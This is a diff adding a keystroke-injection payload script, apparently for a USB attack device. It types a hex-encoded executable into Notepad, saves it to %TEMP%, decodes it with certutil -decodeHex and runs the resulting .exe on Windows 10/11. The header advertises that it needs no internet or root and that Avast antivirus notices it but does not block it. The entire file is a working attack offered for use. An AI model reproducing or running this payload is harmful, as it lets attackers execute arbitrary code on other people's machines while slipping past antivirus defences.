@@ -1,0 +1,52 @@
+* ###########################################################################################
+* #                                                                                         |
+* # Title        : Install And Run Any Arbitrary Executable - No Internet And Root Needed   |
+* # Author       : Aleff                                                                    |
+* # Version      : 1.0                                                                      |
+* # Category     : Execution                                                                |
+* # Target       : Windows 10/11                                                            |
+* #                                                                                         |
+* ###########################################################################################
+
+
+* Requirements:
+*     - Nothing
+
+
+* Note:
+*     - Tested on Windows 11
+*     - Running checked but not blocked by Avast antivirus
+
+
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING notepad.exe
+QUACK ENTER
+QUACK DELAY 2000
+
+* Define here your hexadecimal code
+QUACK STRING #HEX_CODE
+
+QUACK DELAY 2000
+QUACK ALT F
+QUACK DELAY 1000
+QUACK STRING S
+QUACK DELAY 1000
+QUACK STRING "%TEMP%\example.hex"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING certutil -f -decodeHex "%TEMP%\example.hex" "%TEMP%\example.exe"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 250
+QUACK STRING "%TEMP%\example.exe"
+QUACK ENTER
